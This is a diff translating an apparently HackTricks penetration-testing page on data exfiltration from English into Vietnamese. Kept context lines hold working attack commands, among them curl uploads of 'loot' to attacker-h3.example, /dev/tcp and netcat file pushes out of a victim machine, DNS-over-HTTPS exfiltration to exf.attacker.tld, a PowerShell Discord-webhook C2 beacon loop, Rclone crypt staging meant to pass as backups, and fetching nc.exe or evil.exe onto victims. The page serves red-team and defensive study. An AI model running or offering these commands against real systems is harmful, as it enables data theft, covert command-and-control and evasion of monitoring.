@@ -3,17 +3,17 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> For an end-to-end example of staging loot in `C:\Users\Public` and exfiltrating it with Rclone to mimic legitimate backups, review the workflow below.
+> Để xem ví dụ từ đầu đến cuối về cách tập kết loot trong `C:\Users\Public` rồi exfiltrate bằng Rclone để mô phỏng các bản sao lưu hợp lệ, hãy tham khảo quy trình bên dưới.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Commonly whitelisted domains to exfiltrate information
+## Các domain thường được đưa vào whitelist để exfiltrate thông tin
 
-Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
+Truy cập [https://lots-project.com/](https://lots-project.com/) để tìm các domain thường được đưa vào whitelist và có thể bị lạm dụng.
 
-## Copy\&Paste Base64
+## Sao chép\&Dán Base64
 
 **Linux**
 
@@ -57,7 +57,7 @@ Start-BitsTransfer -Source $url -Destination $output
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
 
-### Upload files
+### Tải tệp lên
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -76,7 +76,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
 
-### **HTTPS Server**
+### **Máy chủ HTTPS**
 
 ```python
 # from https://gist.github.com/dergachev/7028596
@@ -121,7 +121,7 @@ if __name__ == "__main__":
 
 ### HTTP/3 / QUIC
 
-If the egress controls are tuned for classic **TCP/443** inspection but are permissive with **UDP/443**, forcing **HTTP/3** can move the transfer into **QUIC** instead of TLS-over-TCP. The attacker endpoint needs native HTTP/3 support (for example, a reverse proxy or upload endpoint already advertising `Alt-Svc: h3`).
+Nếu các biện pháp kiểm soát lưu lượng ra được cấu hình để kiểm tra **TCP/443** truyền thống nhưng cho phép **UDP/443**, việc ép dùng **HTTP/3** có thể chuyển quá trình truyền sang **QUIC** thay vì TLS-over-TCP. Endpoint của kẻ tấn công cần hỗ trợ HTTP/3 gốc (ví dụ: reverse proxy hoặc endpoint tải lên đã quảng bá `Alt-Svc: h3`).
 
 ```bash
 # Strict: fail if QUIC/H3 is not available
@@ -135,11 +135,11 @@ curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
 curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
 ```
 
-A 2025 research paper (QUIC-Exfil) found that QUIC's encrypted headers and dynamic address changes can make firewall-level detection of exfiltration harder than TLS- or DNS-based channels, and demonstrated a server-preferred-address method that disguises exfiltration as server-side connection migration.<sup>[[9]](#references)</sup>
+Một bài nghiên cứu năm 2025 (QUIC-Exfil) phát hiện rằng các header được mã hóa và việc thay đổi địa chỉ động của QUIC có thể khiến việc phát hiện exfiltration ở cấp firewall khó hơn so với các kênh dựa trên TLS hoặc DNS, đồng thời chứng minh một phương thức dùng địa chỉ ưu tiên của máy chủ để ngụy trang exfiltration thành quá trình di chuyển kết nối phía máy chủ.<sup>[[9]](#references)</sup>
 
-### Pre-signed / delegated object-storage uploads
+### Tải lên object storage bằng URL pre-signed / ủy quyền
 
-When you can mint or obtain a short-lived **signed URL**, the victim only needs a normal HTTPS client. This avoids installing cloud SDKs or long-lived credentials on the host.<sup>[[8]](#references)</sup> It can also blend into common object-storage traffic.
+Khi bạn có thể tạo hoặc lấy được một **signed URL** có thời hạn ngắn, nạn nhân chỉ cần một HTTPS client thông thường. Cách này tránh phải cài đặt cloud SDK hoặc lưu thông tin xác thực dài hạn trên máy chủ.<sup>[[8]](#references)</sup> Cách này cũng có thể hòa lẫn vào lưu lượng object storage phổ biến.
 
 **Linux / macOS (AWS S3 pre-signed `PUT`)**
 
@@ -166,15 +166,15 @@ curl -X PUT --data-binary @loot.7z \
   'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
 ```
 
-Notes:
-- Pre-signed URLs / SAS tokens usually scope the **path**, **HTTP method**, and **expiration**.<sup>[[8]](#references)[[10]](#references)</sup>
-- For Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` is mandatory.<sup>[[10]](#references)</sup>
-- This pattern works well with `curl`, `Invoke-WebRequest`, or any custom implant that can issue a raw HTTPS `PUT`.
+Ghi chú:
+- URL pre-signed / token SAS thường giới hạn **đường dẫn**, **phương thức HTTP** và **thời hạn hết hạn**.<sup>[[8]](#references)[[10]](#references)</sup>
+- Với Azure Blob `Put Blob`, bắt buộc phải có `x-ms-blob-type: BlockBlob`.<sup>[[10]](#references)</sup>
+- Cách này hoạt động hiệu quả với `curl`, `Invoke-WebRequest` hoặc bất kỳ implant tùy chỉnh nào có thể gửi yêu cầu HTTPS `PUT` thô.
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server`.<sup>[[4]](#references)</sup>
-It supports upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, and OOB collaboration features (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) là giải pháp thay thế dạng binary đơn cho `python3 -m http.server`.<sup>[[4]](#references)</sup>
+Nó hỗ trợ tải lên, tải xuống, WebDAV, SFTP, SMB, TLS, xác thực, liên kết chia sẻ và các tính năng cộng tác OOB (DNS, SMTP, thu thập hash NTLM).<sup>[[4]](#references)</sup>
 
 ```bash
 # Serve current directory on port 8000
@@ -205,16 +205,16 @@ goshs -smtp -smtp-domain [REDACTED]
 goshs -tunnel
 ```
 
-## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+## Webhooks (Discord/Slack/Teams) cho C2 & Exfiltration dữ liệu
 
-Webhooks are write-only HTTPS endpoints that accept JSON and optional file parts. They’re commonly allowed to trusted SaaS domains and require no OAuth/API keys, making them useful for low-friction beaconing and exfiltration.<sup>[[5]](#references)[[6]](#references)</sup>
+Webhook là các endpoint HTTPS chỉ cho phép ghi, chấp nhận JSON và các phần file tùy chọn. Chúng thường được cho phép truy cập tới các domain SaaS đáng tin cậy và không yêu cầu OAuth/API key, khiến chúng hữu ích cho beaconing và exfiltration ít gây chú ý.<sup>[[5]](#references)[[6]](#references)</sup>
 
-Key ideas:
-- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
-- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
+Ý tưởng chính:
+- Endpoint: Discord sử dụng https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data với một phần có tên payload_json chứa {"content":"..."} và các phần file tùy chọn có tên file.
+- Mẫu vòng lặp cho operator: beacon định kỳ -> do thám thư mục -> exfil file có mục tiêu -> dump dữ liệu do thám -> ngủ. HTTP 204 NoContent/200 OK xác nhận đã gửi.
 
-PowerShell PoC (Discord):
+PoC PowerShell (Discord):
 
 ```powershell
 # 1) Configure webhook and optional target file
@@ -284,21 +284,21 @@ while ($true) {
 }
 ```
 
-Notes:
-- Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
-- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see the related page below.<sup>[[7]](#references)</sup>
+Ghi chú:
+- Các mẫu tương tự áp dụng cho những nền tảng cộng tác khác (Slack/Teams) sử dụng incoming webhook; hãy điều chỉnh URL và JSON schema cho phù hợp.
+- Để biết thêm về DFIR đối với các hiện vật cache của Discord Desktop và việc khôi phục webhook/API, xem trang liên quan bên dưới.<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
-## Rclone (cloud/object-storage exfiltration)
+## Rclone (exfiltration qua cloud/object storage)
 
-Modern operators often **stage loot locally** and then use [Rclone](https://rclone.org/) to make the transfer look like a normal backup or sync job. A practical pattern is:
+Các operator hiện đại thường **staging loot cục bộ**, sau đó dùng [Rclone](https://rclone.org/) để khiến việc truyền dữ liệu trông giống một tác vụ sao lưu hoặc đồng bộ thông thường. Một mẫu thực tế gồm:
 
-1. A normal remote (`s3`, `webdav`, `drive`, `mega`, ...)
-2. A `crypt` wrapper so **contents and filenames are encrypted client-side**
-3. An optional `chunker` wrapper if the provider enforces object-size limits or you want smaller upload units
+1. Một remote thông thường (`s3`, `webdav`, `drive`, `mega`, ...)
+2. Một lớp bọc `crypt` để **mã hóa nội dung và tên tệp ở phía client**
+3. Tùy chọn dùng lớp bọc `chunker` nếu nhà cung cấp áp đặt giới hạn kích thước object hoặc bạn muốn chia dữ liệu tải lên thành các phần nhỏ hơn
 
 ```bash
 # 1) Create the storage backend remote (interactive)
@@ -316,11 +316,11 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 # If you created the chunker wrapper, upload to overlay:... instead
 ```
 
-Notes:
-- `crypt` can encrypt both file contents and names.<sup>[[3]](#references)</sup>
-- `chunker` transparently splits large files and reassembles them on download.<sup>[[11]](#references)</sup>
-- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection.<sup>[[3]](#references)</sup> For short-lived operations, prefer a dedicated temporary config and remove it afterwards. If you must keep it longer, prefer encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) over leaving a bare `rclone.conf` on disk.<sup>[[11]](#references)</sup>
-- If the target already syncs **OneDrive**, **Google Drive**, or **Dropbox**, copying loot into the synchronized directory can piggyback on an already-approved client instead of dropping a new transfer binary.
+Ghi chú:
+- `crypt` có thể mã hóa cả nội dung lẫn tên tệp.<sup>[[3]](#references)</sup>
+- `chunker` tự động chia các tệp lớn thành nhiều phần và ghép lại khi tải xuống.<sup>[[11]](#references)</sup>
+- `rclone.conf` lưu các secret của `crypt` ở dạng **được làm mờ**, không phải biện pháp bảo vệ mạnh khi lưu trữ.<sup>[[3]](#references)</sup> Với các thao tác ngắn hạn, hãy dùng một config tạm thời riêng và xóa nó sau đó. Nếu cần giữ lâu hơn, hãy ưu tiên xử lý config được mã hóa (`RCLONE_CONFIG_PASS` / `--password-command`) thay vì để nguyên một `rclone.conf` trên đĩa.<sup>[[11]](#references)</sup>
+- Nếu mục tiêu đã đồng bộ **OneDrive**, **Google Drive** hoặc **Dropbox**, việc sao chép loot vào thư mục được đồng bộ có thể tận dụng client đã được phê duyệt sẵn, thay vì thả một binary truyền tải mới.
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
@@ -328,7 +328,7 @@ Notes:
 
 ## FTP
 
-### FTP server (python)
+### Máy chủ FTP (python)
 
 ```bash
 pip3 install pyftpdlib
@@ -342,7 +342,7 @@ sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
 
-### FTP server (pure-ftp)
+### Máy chủ FTP (pure-ftp)
 
 ```bash
 apt-get update && apt-get install pure-ftp
@@ -362,7 +362,7 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
 
-### **Windows** client
+### **Windows** máy khách
 
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
@@ -377,7 +377,7 @@ ftp -n -v -s:ftp.txt
 
 ## SMB
 
-Kali as server
+Kali làm máy chủ
 
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
@@ -386,7 +386,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
 
-Or create a smb share **using samba**:
+Hoặc tạo một SMB share **bằng Samba**:
 
 ```bash
 apt-get install samba
@@ -414,7 +414,7 @@ WindPS-2> cd new_disk:
 ```
 
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) is a single-binary alternative that serves files over SMB and captures NTLM hashes from connecting clients.<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) là một giải pháp thay thế dạng binary đơn, dùng để chia sẻ tệp qua SMB và thu thập NTLM hash từ các client kết nối.<sup>[[4]](#references)</sup>
 
 ```bash
 # Start SMB server with NTLM hash capture
@@ -426,7 +426,7 @@ goshs
 
 ## SCP
 
-The attacker has to have SSHd running.
+Kẻ tấn công phải đang chạy SSHd.
 
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
@@ -434,7 +434,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 
 ## SSHFS
 
-If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
+Nếu nạn nhân có SSH, kẻ tấn công có thể mount một thư mục từ máy nạn nhân sang máy của mình.
 
 ```bash
 sudo apt-get install sshfs
@@ -451,14 +451,14 @@ nc -vn <IP> 4444 < exfil_file
 
 ## /dev/tcp
 
-### Download file from victim
+### Tải tệp từ máy nạn nhân
 
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
 
-### Upload file to victim
+### Tải tệp lên nạn nhân
 
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
@@ -467,7 +467,7 @@ exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
 
-thanks to **@BinaryShadow\_**
+cảm ơn **@BinaryShadow\_**
 
 ## **ICMP**
 
@@ -491,7 +491,7 @@ sniff(iface="tun0", prn=process_packet)
 
 ## DNS over HTTPS (DoH)
 
-If classic UDP/53 DNS is noisy or blocked but outbound HTTPS is broadly allowed, the usual DNS-label exfiltration pattern can be wrapped inside **DoH** requests to a public resolver. Keep each label well below the 63-byte DNS limit and use a DNS-safe alphabet such as Base32.
+Nếu DNS cổ điển qua UDP/53 gây nhiều lưu lượng đáng chú ý hoặc bị chặn, nhưng lưu lượng HTTPS outbound nhìn chung được cho phép, mẫu exfiltration qua nhãn DNS thường dùng có thể được gói trong các request **DoH** gửi đến một resolver công cộng. Giữ mỗi nhãn ngắn hơn nhiều so với giới hạn 63 byte của DNS và sử dụng bảng ký tự an toàn cho DNS, chẳng hạn như Base32.
 
 ```bash
 # Encode -> split into DNS-safe labels -> send via DoH
@@ -504,13 +504,13 @@ base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
   done
 ```
 
-On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.<sup>[[2]](#references)</sup>
+Trên authoritative DNS server của `exf.attacker.tld`, sắp xếp các truy vấn theo tiền tố số rồi tái tạo luồng Base32. Cách này giữ cho quá trình truyền dữ liệu diễn ra qua HTTPS đến resolver thay vì DNS UDP/53 cổ điển.<sup>[[2]](#references)</sup>
 
-For full bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, etc.), check [the tunneling page](tunneling-and-port-forwarding.md).
+Để xem các công cụ tạo DNS tunnel hai chiều đầy đủ (`iodine`, `dnscat2`, v.v.), hãy xem [trang tunneling](tunneling-and-port-forwarding.md).
 
 ## **SMTP**
 
-If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
+Nếu có thể gửi dữ liệu đến một SMTP server, bạn có thể tạo một SMTP server để nhận dữ liệu bằng Python:
 
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
@@ -518,15 +518,15 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) can spin up a quick SMTP server to catch email callbacks during OOB exfiltration scenarios.<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) có thể nhanh chóng khởi chạy SMTP server để bắt các email callback trong những tình huống OOB exfiltration.<sup>[[4]](#references)</sup>
 
 ```bash
 # Start SMTP callback server
 goshs -smtp -smtp-domain [REDACTED]
 ```
 
-Received emails and callbacks are displayed directly in the terminal output.
-Can be combined with the DNS callback server for full OOB coverage:
+Email đã nhận và các callback được hiển thị trực tiếp trong đầu ra terminal.
+Có thể kết hợp với DNS callback server để bao phủ OOB đầy đủ:
 
 ```bash
 # DNS + SMTP combined
@@ -535,9 +535,9 @@ goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 
 ## TFTP
 
-By default in XP and 2003 (in others it needs to be explicitly added during installation)
+Mặc định có trong XP và 2003 (ở các phiên bản khác, cần thêm rõ ràng trong quá trình cài đặt)
 
-In Kali, **start TFTP server**:
+Trong Kali, **khởi động máy chủ TFTP**:
 
 ```bash
 #I didn't get this options working and I prefer the python option
@@ -546,14 +546,14 @@ atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
 
-**TFTP server in python:**
+**TFTP server bằng Python:**
 
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
 
-In **victim**, connect to the Kali server:
+Trên **victim**, kết nối đến server Kali:
 
 ```bash
 tftp -i <KALI-IP> get nc.exe
@@ -561,7 +561,7 @@ tftp -i <KALI-IP> get nc.exe
 
 ## PHP
 
-Download a file with a PHP oneliner:
+Tải xuống một tệp bằng đoạn lệnh PHP một dòng:
 
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
@@ -573,7 +573,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 Attacker> python -m SimpleHTTPServer 80
 ```
 
-**Victim**
+**Nạn nhân**
 
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -609,7 +609,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.<sup>[[1]](#references)</sup>
+Chương trình `debug.exe` không chỉ cho phép kiểm tra các file nhị phân mà còn có **khả năng dựng lại chúng từ hex**. Điều này có nghĩa là khi cung cấp hex của một file nhị phân, `debug.exe` có thể tạo ra file nhị phân đó. Tuy nhiên, cần lưu ý rằng debug.exe **chỉ có thể lắp ráp các file có kích thước tối đa 64 kb**.<sup>[[1]](#references)</sup>
 
 ```bash
 # Reduce the size
@@ -617,20 +617,19 @@ upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
 
-Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
+Sau đó sao chép và dán văn bản vào windows-shell, một tệp có tên nc.exe sẽ được tạo.
 
 ## References
 
-- [1] [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [1] [Chuyển tệp sang Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 - [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
-- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [3] [Backend `crypt` của Rclone](https://rclone.org/crypt/)
 - [4] [goshs](https://github.com/patrickhener/goshs)
-- [5] [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
-- [6] [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
-- [7] [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
-- [8] [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
-- [9] [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
+- [5] [Discord làm C2 và bằng chứng đã lưu trong bộ nhớ đệm bị bỏ lại](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [6] [Discord Webhooks – Thực thi Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [7] [Bộ công cụ pháp chứng Discord (trình phân tích bộ nhớ đệm)](https://github.com/jwdfir/discord_cache_parser)
+- [8] [Tải đối tượng lên bằng URL ký trước - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+- [9] [QUIC-Exfil: Khai thác tính năng Preferred Address của máy chủ QUIC để thực hiện các cuộc tấn công đánh cắp dữ liệu](https://arxiv.org/abs/2505.05292)
 - [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
-- [11] [Rclone documentation](https://rclone.org/docs/#configuration-encryption)
-
+- [11] [Tài liệu Rclone](https://rclone.org/docs/#configuration-encryption)
 {{#include ../banners/hacktricks-training.md}}
